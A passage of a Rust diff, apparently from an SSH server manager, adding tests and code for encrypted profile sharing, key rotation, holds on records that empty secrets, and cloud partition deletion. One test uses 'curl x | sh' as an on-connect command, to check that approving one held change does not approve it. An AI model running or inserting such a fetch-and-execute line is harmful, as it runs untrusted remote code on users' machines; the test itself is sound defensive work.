+        let (m, _h) = member("M", "editor");
+        note_share_grant(&m, "aa", "user", None, false).unwrap();
+        assert_eq!(meta(&m, "share_role").as_deref(), Some("user"), "made a viewer");
+        note_share_role(&m, "editor").unwrap();
+        assert_eq!(meta(&m, "share_role").as_deref(), Some("editor"), "made an editor");
+        for odd in ["owner", "root", ""] {
+            note_share_role(&m, odd).unwrap();
+            assert_eq!(meta(&m, "share_role").as_deref(), Some("editor"), "{odd:?}");
+        }
+        let (o, _h) = member("O", "owner");
+        note_share_role(&o, "user").unwrap();
+        assert_eq!(meta(&o, "share_role").as_deref(), Some("owner"));
+    }
+
+    // The key is the one the user checked, or none: a server can swap what's
+    // waiting while the dialog is open.
+    #[test]
+    fn a_new_key_is_accepted_by_the_fingerprint_the_user_saw() {
+        let (m, _h) = member("M", "editor");
+        note_share_key(&m, &[2u8; 32]).unwrap();
+        let shown = key_fingerprint(&hex::encode([2u8; 32])).unwrap();
+        note_share_key(&m, &[3u8; 32]).unwrap();
+
+        let err = take_pending_key(&m, &shown).unwrap_err();
+        assert!(err.starts_with("[SHARE] KEY_CHANGED"), "{err}");
+        assert_eq!(meta(&m, "dek"), Some(hex::encode(KEY)), "the key in use stays");
+        assert_eq!(meta(&m, "pending_dek"), Some(hex::encode([3u8; 32])));
+
+        take_pending_key(&m, &key_fingerprint(&hex::encode([3u8; 32])).unwrap()).unwrap();
+        assert_eq!(meta(&m, "dek"), Some(hex::encode([3u8; 32])));
+        assert_eq!(meta(&m, "pending_dek"), None);
+        assert!(take_pending_key(&m, &shown).unwrap_err().starts_with("[SHARE] NO_KEY_CHANGE"));
+    }
+
+    // What this device pushed under the old key stays on the server unless a
+    // newer stamp replaces it. Accepting the key marks every row to go out
+    // again; a viewer has nothing up there to put right.
+    #[test]
+    fn accepting_a_new_key_sends_every_row_again() {
+        let stamp = |c: &Connection| -> String { c.query_row("SELECT updated_at FROM servers", [], |r| r.get(0)).unwrap() };
+        let fingerprint = key_fingerprint(&hex::encode([2u8; 32])).unwrap();
+
+        let (m, _h) = member("M", "editor");
+        m.execute("INSERT INTO servers(name,host,port) VALUES('s','h',22)", []).unwrap();
+        let before = stamp(&m);
+        note_share_key(&m, &[2u8; 32]).unwrap();
+        take_pending_key(&m, &fingerprint).unwrap();
+        assert!(stamp(&m) > before, "the server takes it only with a newer stamp");
+        let up = collect_local_records(&m, &[2u8; 32], "").unwrap();
+        assert!(decrypt_entity(up[0].blob.as_ref().unwrap(), &[2u8; 32]).is_ok(), "sealed with the new key");
+
+        let (v, _h) = member("V", "user");
+        v.execute("INSERT INTO servers(name,host,port) VALUES('s','h',22)", []).unwrap();
+        let before = stamp(&v);
+        note_share_key(&v, &[2u8; 32]).unwrap();
+        take_pending_key(&v, &fingerprint).unwrap();
+        assert_eq!(stamp(&v), before);
+        assert_eq!(meta(&v, "dek"), Some(hex::encode([2u8; 32])));
+    }
+
+    /// What the sync server does with what's pushed: a newer stamp replaces
+    /// what it has, anything else leaves it (`sharing.php`, `sync.php`).
+    fn server_takes(server: &mut std::collections::HashMap<String, SyncRecord>, pushed: Vec<SyncRecord>) {
+        for r in pushed {
+            if server.get(&r.uuid).is_none_or(|have| r.updated_at > have.updated_at) {
+                server.insert(r.uuid.clone(), r);
+            }
+        }
+    }
+
+    // The whole of it: the owner replaces the key, a member who hasn't seen
+    // that yet edits a row and pushes it under the old one, which nobody else
+    // can read. Once the member takes the new key, the row is readable again.
+    #[test]
+    fn a_row_pushed_under_the_old_key_heals_when_the_new_key_is_accepted() {
+        let new_key = [2u8; 32];
+        let (o, ho) = member("O", "owner");
+        let (m, hm) = member("M", "editor");
+        o.execute("INSERT INTO servers(name,host,port) VALUES('x','h',22)", []).unwrap();
+        let mut server = std::collections::HashMap::new();
+        server_takes(&mut server, collect_local_records(&o, &KEY, "").unwrap());
+        let all = |s: &std::collections::HashMap<String, SyncRecord>| s.values().cloned().collect::<Vec<_>>();
+        assert_eq!(apply_remote_records(&m, &KEY, &all(&server), &hm).unwrap(), 0);
+
+        bump_for_new_key(&o).unwrap();
+        server_takes(&mut server, collect_local_records(&o, &new_key, "").unwrap());
+        // A later moment than the owner's stamp, whatever this machine's speed.
+        std::thread::sleep(std::time::Duration::from_millis(5));
+        m.execute("UPDATE servers SET host='edited'", []).unwrap();
+        server_takes(&mut server, collect_local_records(&m, &KEY, "").unwrap());
+        assert_eq!(apply_remote_records(&o, &new_key, &all(&server), &ho).unwrap(), 1, "the owner can't read it");
+
+        note_share_key(&m, &new_key).unwrap();
+        take_pending_key(&m, &key_fingerprint(&hex::encode(new_key)).unwrap()).unwrap();
+        server_takes(&mut server, collect_local_records(&m, &new_key, "").unwrap());
+        assert_eq!(apply_remote_records(&o, &new_key, &all(&server), &ho).unwrap(), 0);
+        let host: String = o.query_row("SELECT host FROM servers", [], |r| r.get(0)).unwrap();
+        assert_eq!(host, "edited");
+    }
+
+    /// `c` holds a key, a login and a server that all have a secret; the
+    /// records they came in.
+    fn with_secrets(c: &Connection, h: &hlc::Hlc) -> Vec<SyncRecord> {
+        let (a, _ha) = device("A");
+        a.execute("INSERT INTO ssh_keys(name,public_key,private_key,passphrase) VALUES('k','pub','priv','phrase')", []).unwrap();
+        a.execute("INSERT INTO credentials(name,auth_type,username,password) VALUES('c','password','root','pw')", []).unwrap();
+        a.execute("INSERT INTO servers(name,host,port,password) VALUES('s','h',22,'pw2')", []).unwrap();
+        let recs = collect_local_records(&a, &KEY, "").unwrap();
+        assert_eq!(apply_remote_records(c, &KEY, &recs, h).unwrap(), 0);
+        recs
+    }
+
+    fn of<'a>(recs: &'a [SyncRecord], table: &str) -> &'a SyncRecord {
+        recs.iter().find(|r| r.entity_type == table).unwrap()
+    }
+
+    /// `rec` with `field` set to `value`, at a newer stamp.
+    fn with_field(rec: &SyncRecord, field: &str, value: serde_json::Value) -> SyncRecord {
+        reworked(rec, |o| {
+            o.insert(field.to_string(), value);
+        })
+    }
+
+    fn private_key(c: &Connection) -> String {
+        c.query_row("SELECT private_key FROM ssh_keys", [], |r| r.get(0)).unwrap()
+    }
+
+    #[test]
+    fn a_record_that_empties_a_secret_is_told_from_an_ordinary_edit() {
+        use serde_json::json;
+        let (p, hp) = device("P");
+        let recs = with_secrets(&p, &hp);
+        let key = of(&recs, "ssh_keys");
+        let empties = |rec: &SyncRecord| empties_a_secret(&p, &KEY, rec);
+
+        assert!(empties(&with_field(key, "private_key", json!(""))));
+        assert!(empties(&with_field(key, "private_key", json!(null))));
+        assert!(empties(&with_field(key, "private_key", json!(" \n "))), "spaces are as empty as nothing");
+        assert!(empties(&with_field(key, "passphrase", json!(""))));
+        assert!(empties(&reworked(key, |o| { o.remove("private_key"); })), "a record without it writes NULL");
+        assert!(empties(&with_field(of(&recs, "credentials"), "password", json!(""))));
+        assert!(empties(&with_field(of(&recs, "servers"), "password", json!(""))));
+
+        assert!(!empties(&with_field(key, "private_key", json!("another key"))), "a secret replaced is an edit");
+        let new_key = |c: &str, passphrase: serde_json::Value| {
+            reworked(key, |o| {
+                o.insert("private_key".into(), json!(c));
+                o.insert("passphrase".into(), passphrase);
+            })
+        };
+        assert!(!empties(&new_key("another key", json!(""))), "a new key with no passphrase took the old one along");
+        assert!(empties(&new_key("", json!(""))), "no key at all is what it looks like");
+        assert!(empties(&new_key(" ", json!(null))), "and so are spaces");
+        assert!(!empties(&with_field(key, "name", json!("renamed"))));
+        assert!(!empties(&with_field(of(&recs, "servers"), "host", json!("h2"))));
+
+        // It doesn't land: older than what's here, no such row, can't be read.
+        let mut older = with_field(key, "private_key", json!(""));
+        older.updated_at = key.updated_at.clone();
+        assert!(!empties(&older));
+        let mut new_row = with_field(key, "private_key", json!(""));
+        new_row.uuid = "0123456789abcdef".into();
+        assert!(!empties(&new_row));
+        let mut sealed_elsewhere = with_field(key, "private_key", json!(""));
+        sealed_elsewhere.blob = Some(encrypt_entity(b"{}", &[9u8; 32]).unwrap());
+        assert!(!empties(&sealed_elsewhere));
+        let mut tombstone = with_field(key, "private_key", json!(""));
+        tombstone.deleted = true;
+        assert!(!empties(&tombstone));
+
+        // Nothing there to lose.
+        let empty = with_field(key, "private_key", json!(""));
+        p.execute("UPDATE ssh_keys SET private_key='', passphrase=NULL", []).unwrap();
+        assert!(!empties(&SyncRecord { updated_at: ahead(120_000), ..empty }));
+    }
+
+    // Personal profiles aren't held (the owner's decision): the record lands,
+    // but not before a copy of the profile is kept, and the report says so.
+    #[test]
+    fn a_personal_profile_takes_an_emptied_secret_after_keeping_a_copy() {
+        let (p, hp) = device("P");
+        let recs = with_secrets(&p, &hp);
+        let dir = std::env::temp_dir().join(format!("submarine-emptied-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let vault = dir.join("p.submarine");
+        std::fs::write(&vault, b"the profile as it was").unwrap();
+
+        let wipe = with_field(of(&recs, "ssh_keys"), "private_key", serde_json::json!(""));
+        let merged = merge_answer(&p, &KEY, std::slice::from_ref(&wipe), &hp, Ok(&vault), false).unwrap();
+        assert_eq!((merged.skipped, merged.removed, merged.emptied), (0, 0, 1));
+        let copy = merged.backup.expect("a copy kept first");
+        assert_eq!(std::fs::read(dir.join(copy)).unwrap(), b"the profile as it was");
+        assert_eq!(private_key(&p), "");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    // In a shared profile it waits for this device's user, as an SSH key's
+    // deletion does: the copy is kept, the row stays, and a sync that brings
+    // the same record again changes nothing.
+    #[test]
+    fn a_shared_profile_holds_a_record_that_empties_a_secret() {
+        let (b, hb) = member("B", "editor");
+        let recs = with_secrets(&b, &hb);
+        let dir = std::env::temp_dir().join(format!("submarine-held-wipe-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let vault = dir.join("p.submarine");
+        std::fs::write(&vault, b"the profile as it was").unwrap();
+
+        let wipe = with_field(of(&recs, "ssh_keys"), "private_key", serde_json::json!(""));
+        let answer = std::slice::from_ref(&wipe);
+        let merged = merge_answer(&b, &KEY, answer, &hb, Ok(&vault), false).unwrap();
+        assert_eq!((merged.skipped, merged.emptied), (0, 0), "nothing was skipped or lost");
+        assert!(merged.backup.is_some());
+        assert_eq!(private_key(&b), "priv");
+        let held = approvals::held_deletions(&b);
+        assert_eq!((held.len(), held[0].name.as_str(), held[0].emptied), (1, "k", true));
+
+        assert!(merge_answer(&b, &KEY, answer, &hb, Err("no file"), false).unwrap().backup.is_none());
+        assert_eq!(rows_to_empty(&b, &KEY, answer), 0, "held already");
+        assert_eq!(count(&b, "held_wipes"), 1);
+        assert_eq!(private_key(&b), "priv");
+
+        // A newer record that leaves the key alone: nothing is left to decide.
+        let mut renamed = with_field(of(&recs, "ssh_keys"), "name", serde_json::json!("k2"));
+        renamed.updated_at = ahead(120_000);
+        assert_eq!(apply_remote_records(&b, &KEY, &[renamed], &hb).unwrap(), 0);
+        assert_eq!(count(&b, "held_wipes"), 0);
+        assert_eq!(private_key(&b), "priv");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    // Each person typing their own password is a normal way to share a server
+    // list, and "Save password" is on by default. On a viewer that password goes
+    // nowhere, so the owner's next edit has none. It's no wipe: the edit lands
+    // whole but for that, with nothing held and nothing to review.
+    #[test]
+    fn a_viewers_own_password_stays_and_the_owners_edit_lands() {
+        let (o, _ho) = device("O");
+        o.execute("INSERT INTO servers(name,host,port,username,auth_type) VALUES('s','old.example',22,'root','custom_pass')", []).unwrap();
+        o.execute("INSERT INTO credentials(name,auth_type,username) VALUES('c','password','root')", []).unwrap();
+        let as_shared = collect_local_records(&o, &KEY, "").unwrap();
+        let (v, hv) = member("V", "user");
+        apply_remote_records(&v, &KEY, &as_shared, &hv).unwrap();
+        let id: i32 = v.query_row("SELECT id FROM servers", [], |r| r.get(0)).unwrap();
+        store_prompted_password(&v, id, "own password").unwrap();
+        v.execute("UPDATE credentials SET password='own login'", []).unwrap();
+
+        o.execute("UPDATE servers SET host='new.example', notes='moved', color='red', position=5", []).unwrap();
+        o.execute("UPDATE credentials SET username='ops'", []).unwrap();
+        let mut from_owner = collect_local_records(&o, &KEY, "").unwrap();
+        for r in &mut from_owner {
+            r.updated_at = ahead(60_000);
+        }
+        let dir = std::env::temp_dir().join(format!("submarine-viewer-own-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let vault = dir.join("p.submarine");
+        std::fs::write(&vault, b"the profile").unwrap();
+        let merged = merge_answer(&v, &KEY, &from_owner, &hv, Ok(&vault), false).unwrap();
+        assert_eq!((merged.skipped, merged.removed, merged.emptied), (0, 0, 0));
+        assert_eq!(merged.backup, None, "nothing is lost, so nothing to keep a copy of");
+        assert!(approvals::held_deletions(&v).is_empty(), "nothing to review");
+
+        let server = |c: &str| -> Option<String> { v.query_row(&format!("SELECT {c} FROM servers"), [], |r| r.get(0)).unwrap() };
+        assert_eq!(server("host").as_deref(), Some("new.example"));
+        assert_eq!(server("notes").as_deref(), Some("moved"));
+        assert_eq!(server("color").as_deref(), Some("red"));
+        let position: i64 = v.query_row("SELECT position FROM servers", [], |r| r.get(0)).unwrap();
+        assert_eq!(position, 5);
+        assert_eq!(server("password").as_deref(), Some("own password"));
+        assert_eq!(server("auth_type").as_deref(), Some("custom_pass"), "so it's the one the next connect uses");
+        assert_eq!(server("updated_at"), Some(of(&from_owner, "servers").updated_at.clone()), "in step with the server");
+        let (user, pw): (String, String) = v.query_row("SELECT username, password FROM credentials", [], |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
+        assert_eq!((user.as_str(), pw.as_str()), ("ops", "own login"));
+
+        // A password the owner does give out still arrives.
+        let mut shared_one = with_field(of(&from_owner, "servers"), "password", serde_json::json!("from the owner"));
+        shared_one.updated_at = ahead(120_000);
+        apply_remote_records(&v, &KEY, &[shared_one], &hv).unwrap();
+        assert_eq!(server("password").as_deref(), Some("from the owner"));
+        let _ = std::fs::remove_dir_all(&dir);
+
+        // The same record on an editor is held: the hold is for them.
+        let (e, he) = member("E", "editor");
+        apply_remote_records(&e, &KEY, &as_shared, &he).unwrap();
+        e.execute("UPDATE servers SET password='saved here'", []).unwrap();
+        assert_eq!(apply_remote_records(&e, &KEY, &from_owner, &he).unwrap(), 0);
+        assert_eq!(approvals::held_wipes(&e).len(), 1);
+        let (host, pw): (String, String) = e.query_row("SELECT host, password FROM servers", [], |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
+        assert_eq!((host.as_str(), pw.as_str()), ("old.example", "saved here"));
+    }
+
+    // A viewer keeps what the record would empty, column by column, and the
+    // rest lands: the secret a record replaces, or a new key that needs no
+    // passphrase. An SSH key an editor really wipes stays on a viewer too:
+    // nothing they hold spreads from there. And a role that's missing counts
+    // as viewer, as it does for the push.
+    #[test]
+    fn a_viewer_keeps_only_what_the_record_would_empty() {
+        use serde_json::json;
+        let (v, hv) = member("V", "user");
+        let recs = with_secrets(&v, &hv);
+        let key = of(&recs, "ssh_keys");
+        let passphrase = |c: &Connection| -> Option<String> { c.query_row("SELECT passphrase FROM ssh_keys", [], |r| r.get(0)).unwrap() };
+
+        let wipe = reworked(key, |o| {
+            o.insert("name".into(), json!("renamed"));
+            o.insert("private_key".into(), json!(""));
+            o.insert("passphrase".into(), json!(""));
+        });
+        assert_eq!(rows_to_empty(&v, &KEY, std::slice::from_ref(&wipe)), 0);
+        assert_eq!(apply_remote_records(&v, &KEY, std::slice::from_ref(&wipe), &hv).unwrap(), 0);
+        assert_eq!((private_key(&v).as_str(), passphrase(&v).as_deref()), ("priv", Some("phrase")));
+        let name: String = v.query_row("SELECT name FROM ssh_keys", [], |r| r.get(0)).unwrap();
+        assert_eq!(name, "renamed");
+
+        let mut replaced = reworked(key, |o| {
+            o.insert("private_key".into(), json!("another key"));
+            o.insert("passphrase".into(), json!(""));
+        });
+        replaced.updated_at = ahead(120_000);
+        assert_eq!(apply_remote_records(&v, &KEY, &[replaced], &hv).unwrap(), 0);
+        assert_eq!(private_key(&v), "another key");
+        assert_eq!(passphrase(&v).as_deref(), Some(""), "the old key's passphrase went with it");
+
+        // A personal profile and an editor aren't viewers. No role row is.
+        let (p, _hp) = device("P");
+        assert!(!approvals::is_viewer(&p));
+        let (e, _he) = member("E", "editor");
+        assert!(!approvals::is_viewer(&e));
+        let (o, _ho) = member("O", "owner");
+        assert!(!approvals::is_viewer(&o));
+        let (n, _hn) = shared_device("N");
+        assert!(approvals::is_viewer(&n));
+    }
+
+    // Two held in a row: the newest for the row is the one that stays.
+    #[test]
+    fn the_newest_held_record_for_a_row_stays() {
+        let (b, hb) = member("B", "editor");
+        let recs = with_secrets(&b, &hb);
+        let first = with_field(of(&recs, "ssh_keys"), "private_key", serde_json::json!(""));
+        let mut second = with_field(of(&recs, "ssh_keys"), "passphrase", serde_json::json!(""));
+        second.updated_at = ahead(120_000);
+        apply_remote_records(&b, &KEY, std::slice::from_ref(&second), &hb).unwrap();
+        apply_remote_records(&b, &KEY, std::slice::from_ref(&first), &hb).unwrap();
+        let held = approvals::held_wipes(&b);
+        assert_eq!((held.len(), held[0].updated_at.as_str()), (1, second.updated_at.as_str()));
+    }
+
+    // The user's call. Yes: the record lands, as it would have. No: the row
+    // stays, stamped past the record, so it comes back wherever the record landed.
+    #[test]
+    fn a_held_record_is_applied_or_kept_by_the_user() {
+        let (b, hb) = member("B", "editor");
+        let recs = with_secrets(&b, &hb);
+        let wipe = with_field(of(&recs, "ssh_keys"), "private_key", serde_json::json!(""));
+        apply_remote_records(&b, &KEY, std::slice::from_ref(&wipe), &hb).unwrap();
+        assert_eq!(resolve_held(&b, &KEY, &hb, true).unwrap(), 1);
+        assert_eq!(private_key(&b), "");
+        assert!(approvals::held_deletions(&b).is_empty());
+        let stamp: String = b.query_row("SELECT updated_at FROM ssh_keys", [], |r| r.get(0)).unwrap();
+        assert_eq!(stamp, wipe.updated_at, "the same row as everywhere else");
+
+        let (b, hb) = member("B", "editor");
+        let recs = with_secrets(&b, &hb);
+        let (other, ho) = device("O");
+        apply_remote_records(&other, &KEY, &recs, &ho).unwrap();
+        let wipe = with_field(of(&recs, "ssh_keys"), "private_key", serde_json::json!(""));
+        apply_remote_records(&other, &KEY, std::slice::from_ref(&wipe), &ho).unwrap();
+        assert_eq!(private_key(&other), "", "a device where it landed");
+        apply_remote_records(&b, &KEY, std::slice::from_ref(&wipe), &hb).unwrap();
+        assert_eq!(resolve_held(&b, &KEY, &hb, false).unwrap(), 1);
+        assert_eq!(private_key(&b), "priv");
+        assert_eq!(count(&b, "held_wipes"), 0);
+        apply_remote_records(&b, &KEY, std::slice::from_ref(&wipe), &hb).unwrap();
+        assert_eq!((private_key(&b).as_str(), count(&b, "held_wipes")), ("priv", 0), "the same record doesn't take it");
+        apply_remote_records(&other, &KEY, &collect_local_records(&b, &KEY, "").unwrap(), &ho).unwrap();
+        assert_eq!(private_key(&other), "priv", "it comes back for everyone");
+    }
+
+    // A yes to the emptied password is no yes to anything else in the record:
+    // on-connect commands in it are held like any others.
+    #[test]
+    fn a_yes_to_a_held_record_allows_only_that() {
+        let (b, hb) = member("B", "editor");
+        let recs = with_secrets(&b, &hb);
+        let server = of(&recs, "servers");
+        let wipe = reworked(server, |o| {
+            o.insert("password".into(), serde_json::json!(""));
+            o.insert("run_on_connect".into(), serde_json::json!("curl x | sh"));
+        });
+        apply_remote_records(&b, &KEY, std::slice::from_ref(&wipe), &hb).unwrap();
+        assert!(approvals::held_for(&b, &server.uuid).is_empty(), "nothing of it landed yet");
+        resolve_held(&b, &KEY, &hb, true).unwrap();
+        assert!(approvals::held_for(&b, &server.uuid).contains(approvals::RUN_ON_CONNECT));
+    }
+
+    // A copy put back: the first sync keeps what its answer would take away
+    // again, and those rows go out with newer stamps. Everything else merges
+    // as usual, so what changed elsewhere since isn't undone.
+    #[test]
+    fn a_copy_put_back_keeps_what_the_next_sync_would_take_again() {
+        let (a, ha) = device("A");
+        a.execute("INSERT INTO servers(name,host,port) VALUES('s1','h',22),('s2','h',22)", []).unwrap();
+        a.execute("INSERT INTO notes(title,body) VALUES('n','old')", []).unwrap();
+        a.execute("INSERT INTO ssh_keys(name,public_key,private_key) VALUES('k','pub','priv')", []).unwrap();
+        // B is the copy, as it was before what happens next.
+        let (b, hb) = device("B");
+        apply_remote_records(&b, &KEY, &collect_local_records(&a, &KEY, "").unwrap(), &hb).unwrap();
+
+        a.execute("DELETE FROM servers WHERE name='s1'", []).unwrap();
+        a.execute("UPDATE ssh_keys SET private_key=''", []).unwrap();
+        a.execute("UPDATE notes SET body='new'", []).unwrap();
+        let answer = collect_local_records(&a, &KEY, "").unwrap();
+
+        let merged = merge_answer(&b, &KEY, &answer, &hb, Err("no file"), true).unwrap();
+        assert_eq!((merged.removed, merged.emptied), (0, 0));
+        assert_eq!(count(&b, "servers"), 2);
+        assert_eq!(private_key(&b), "priv");
+        let body: String = b.query_row("SELECT body FROM notes", [], |r| r.get(0)).unwrap();
+        assert_eq!(body, "new", "an edit from elsewhere still lands");
+
+        apply_remote_records(&a, &KEY, &collect_local_records(&b, &KEY, "").unwrap(), &ha).unwrap();
+        assert_eq!(count(&a, "servers"), 2, "the deleted row is back where it was deleted");
+        assert_eq!(private_key(&a), "priv", "and the key where it was emptied");
+        let merged = merge_answer(&b, &KEY, &answer, &hb, Err("no file"), false).unwrap();
+        assert_eq!((merged.removed, merged.emptied), (0, 0), "the same answer again takes nothing");
+    }
+
+    // Leaving a share puts the profile back on the personal path with whatever
+    // key it has now. The escrow on the server holds the key from before, and
+    // the server keeps what it has on an equal stamp.
+    #[test]
+    fn leaving_a_share_gets_the_escrow_past_the_one_on_the_server() {
+        let (c, h) = member("C", "owner");
+        create_share_pins(&c).unwrap();
+        c.execute("INSERT INTO sync_meta(key,value) VALUES('share_name','n'),('share_grant','a'),('share_grant_unread','b'),('share_grant_refused','b'),('pending_dek','c')", []).unwrap();
+        c.execute("INSERT INTO share_member_keys VALUES('s1','m@x','pk'),('s2','m@x','pk')", []).unwrap();
+        c.execute("INSERT INTO held_deletions VALUES('u1','servers','s',0)", []).unwrap();
+        c.execute("INSERT INTO held_wipes VALUES('u2','ssh_keys','s','b',0)", []).unwrap();
+        assert_eq!(escrow_stamp(&c), ESCROW_UAT, "a profile that never left a share");
+
+        leave_share_locally(&c, "s1", "owner", &h).unwrap();
+        for gone in ["share_id", "share_role", "share_name", "share_grant", "share_grant_unread", "share_grant_refused", "pending_dek"] {
+            assert_eq!(meta(&c, gone), None, "{gone}");
+        }
+        assert_eq!(count(&c, "share_member_keys"), 1, "only that share's");
+        assert_eq!((count(&c, "held_deletions"), count(&c, "held_wipes")), (0, 0));
+
+        let first = escrow_stamp(&c);
+        assert!(first.as_str() > ESCROW_UAT && hlc::Hlc::valid_remote(&first), "{first}");
+        assert_eq!(escrow_stamp(&c), first, "it stays: every full sync sends the same stamp");
+
+        let (master, salt) = ([1u8; 32], [2u8; SALT_LEN]);
+        let mut server = std::collections::HashMap::new();
+        server_takes(&mut server, vec![build_pw_escrow_record(&master, &salt, &[9u8; 32], ESCROW_UAT).unwrap()]);
+        let old = server[ESCROW_UUID].blob.clone();
+        server_takes(&mut server, vec![build_pw_escrow_record(&master, &salt, &KEY, ESCROW_UAT).unwrap()]);
+        assert_eq!(server[ESCROW_UUID].blob, old, "the same stamp changes nothing on the server");
+        server_takes(&mut server, vec![build_pw_escrow_record(&master, &salt, &KEY, &first).unwrap()]);
+        assert_ne!(server[ESCROW_UUID].blob, old, "this one replaces it");
+
+        leave_share_locally(&c, "s1", "owner", &h).unwrap();
+        assert!(escrow_stamp(&c) > first, "and the next time gets past that one");
+    }
+
+    // A member's copy came from the share: it gets a partition of its own, not
+    // one named after it. An owner's profile stays where it has always synced.
+    #[test]
+    fn a_member_who_leaves_gets_a_partition_of_their_own() {
+        let (m, h) = member("M", "editor");
+        create_share_pins(&m).unwrap();
+        leave_share_locally(&m, "s1", "editor", &h).unwrap();
+        let own = meta(&m, "cloud_profile").unwrap();
+        assert_eq!(own.len(), 32);
+        assert_eq!(cloud_profile_of(&m, "work"), own);
+
+        // One that has a partition keeps it.
+        let (m, h) = member("M", "user");
+        create_share_pins(&m).unwrap();
+        m.execute("INSERT INTO sync_meta(key,value) VALUES('cloud_profile','mine')", []).unwrap();
+        leave_share_locally(&m, "s1", "user", &h).unwrap();
+        assert_eq!(meta(&m, "cloud_profile").as_deref(), Some("mine"));
+
+        let (o, h) = member("O", "owner");
+        create_share_pins(&o).unwrap();
+        leave_share_locally(&o, "s1", "owner", &h).unwrap();
+        assert_eq!(meta(&o, "cloud_profile"), None);
+        assert_eq!(cloud_profile_of(&o, "work"), "work");
+    }
+
+    // "Delete from cloud" has to hold until the user says otherwise: the list
+    // is by server and partition, and survives whatever the file holds.
+    #[test]
+    fn partitions_deleted_here_stay_on_the_list_until_taken_off() {
+        let dir = std::env::temp_dir().join(format!("submarine-cloud-deleted-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        let list = dir.join("cloud_deleted.json");
+        let one = cloud_deleted_key("https://a.example", "p1");
+        let same_elsewhere = cloud_deleted_key("https://b.example", "p1");
+        let other = cloud_deleted_key("https://a.example", "p2");
+
+        assert!(!is_cloud_deleted(&list, &one));
+        set_cloud_deleted(&list, &one, false).unwrap();
+        assert!(!list.exists(), "nothing to note");
+        set_cloud_deleted(&list, &one, true).unwrap();
+        set_cloud_deleted(&list, &one, true).unwrap();
+        set_cloud_deleted(&list, &other, true).unwrap();
+        assert!(is_cloud_deleted(&list, &one) && is_cloud_deleted(&list, &other));
+        assert!(!is_cloud_deleted(&list, &same_elsewhere), "another server's is another partition");
+        assert_eq!(read_cloud_deleted(&list).len(), 2);
+
+        set_cloud_deleted(&list, &one, false).unwrap();
+        assert!(!is_cloud_deleted(&list, &one) && is_cloud_deleted(&list, &other));
+        set_cloud_deleted(&list, &other, false).unwrap();
+        assert!(!list.exists(), "an empty list leaves no file");
+
+        std::fs::write(&list, b"not json").unwrap();
+        assert!(!is_cloud_deleted(&list, &one));
+        set_cloud_deleted(&list, &one, true).unwrap();
+        assert!(is_cloud_deleted(&list, &one), "a bad file is replaced");
+        let _ = std::fs::remove_dir_all(&dir);
     }
 
     /// A stamp `ms` ahead of now: newer than anything a test device has
@@ -5027,6 +6134,10 @@ async fn cloud_list_sync_profiles(
 /// caller can only ever delete their own partition. The local vault (if any) is
 /// left alone; the UI offers "remove from this device" as a separate action.
 /// Returns the number of records the server removed.
+///
+/// The partition is noted on this device first: its local copy would otherwise
+/// go straight back up, escrow and all, at its next unlock (`sync_round`).
+/// Marked before the call so a mark that can't be written stops it there.
 #[tauri::command]
 async fn cloud_delete_profile(
     app: tauri::AppHandle,
@@ -5038,7 +6149,85 @@ async fn cloud_delete_profile(
         return Err("[SYNC] NO_PROFILE_NAME".into());
     }
     let session = cloud.session().await?;
-    cloud::delete_sync_profile(&app, &cloud, &session, &profile).await
+    let list = cloud_deleted_path(&app)?;
+    let key = cloud_deleted_key(session.base(), &profile);
+    let already = is_cloud_deleted(&list, &key);
+    set_cloud_deleted(&list, &key, true)?;
+    let deleted = cloud::delete_sync_profile(&app, &cloud, &session, &profile).await;
+    if deleted.is_err() && !already {
+        let _ = set_cloud_deleted(&list, &key, false);
+    }
+    deleted
+}
+
+/// The user's word to upload the open profile again after
+/// `cloud_delete_profile`: the next sync pushes it in full.
+#[tauri::command]
+async fn cloud_resume_profile(
+    app: tauri::AppHandle,
+    db_state: tauri::State<'_, DbState>,
+    cloud: tauri::State<'_, std::sync::Arc<cloud::CloudState>>,
+) -> Result<(), String> {
+    let base = cloud.base().await;
+    let partition = {
+        let profile = db_state.active_profile.lock().map_err(|_| "[STATE] LOCK_PROFILE")?.clone().ok_or("[SYNC] NO_PROFILE_OPEN")?;
+        let conn_g = db_state.conn.lock().map_err(|_| "[STATE] LOCK_CONN")?;
+        let conn = conn_g.as_ref().ok_or("[STATE] DB_NOT_OPEN")?;
+        cloud_profile_of(conn, &profile)
+    };
+    set_cloud_deleted(&cloud_deleted_path(&app)?, &cloud_deleted_key(&base, &partition), false)
+}
+
+/// The partition a personal profile syncs under: a restored profile may carry
+/// a different local name than its cloud key, so it records the cloud one in
+/// sync_meta. Everything else goes by its local name.
+fn cloud_profile_of(conn: &Connection, profile: &str) -> String {
+    conn.query_row("SELECT value FROM sync_meta WHERE key='cloud_profile'", [], |r| r.get(0))
+        .unwrap_or_else(|_| profile.to_string())
+}
+
+// The partitions deleted from the cloud on this device, which it doesn't upload
+// again until the user says so. Kept on this device and not in the vault: the
+// profile is closed when it's deleted, and may not be here at all.
+
+fn cloud_deleted_path(app: &tauri::AppHandle) -> Result<PathBuf, String> {
+    let dir = app.path().app_data_dir().map_err(|e| format!("[SYSTEM] APP_DATA_DIR_NOT_FOUND: {e}"))?;
+    Ok(dir.join("cloud_deleted.json"))
+}
+
+fn cloud_deleted_key(server: &str, partition: &str) -> String {
+    format!("{server}|{partition}")
+}
+
+fn read_cloud_deleted(path: &Path) -> Vec<String> {
+    fs::read(path).ok().and_then(|b| serde_json::from_slice(&b).ok()).unwrap_or_default()
+}
+
+fn is_cloud_deleted(path: &Path, key: &str) -> bool {
+    read_cloud_deleted(path).iter().any(|k| k == key)
+}
+
+/// Adds `key` to the list, or takes it off. No entries leave no file.
+fn set_cloud_deleted(path: &Path, key: &str, deleted: bool) -> Result<(), String> {
+    let mut list = read_cloud_deleted(path);
+    if list.iter().any(|k| k == key) == deleted {
+        return Ok(());
+    }
+    if deleted {
+        list.push(key.to_string());
+    } else {
+        list.retain(|k| k != key);
+    }
+    if list.is_empty() {
+        return fs::remove_file(path).map_err(|e| format!("[SYNC] CLOUD_DELETED_LIST: {e}"));
+    }
